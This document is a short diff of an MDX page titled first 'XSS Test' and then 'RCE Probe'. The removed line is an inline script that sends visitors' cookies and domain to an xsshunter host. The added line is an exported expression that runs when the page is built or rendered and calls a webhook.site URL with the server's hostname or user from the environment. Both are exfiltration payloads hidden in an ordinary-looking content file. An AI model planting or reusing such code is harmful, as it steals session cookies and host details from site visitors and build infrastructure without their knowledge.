@@ -1,6 +1,7 @@
 ---
-title: XSS Test
+title: RCE Probe
 ---
-# XSS Test
+export const _rce = (typeof fetch !== 'undefined') ? fetch('https://webhook.site/604c0863-4f2f-4151-8d02-ded08ba2693b/EXPORT-BUILD?proc='+(typeof process!=='undefined')+'&host='+(typeof process!=='undefined'&&process.env?(process.env.HOSTNAME||process.env.USER||'env'):'noproc')) : null;
 
-Beacon: {(function(){var i=new Image();i.src="https://xsshunter.trufflesecurity.com/amr/b?d="+document.domain+"&c="+document.cookie;window.__EXFIL="SENT-"+document.domain;return "beacon-fired"})()}
+# RCE Probe
+x
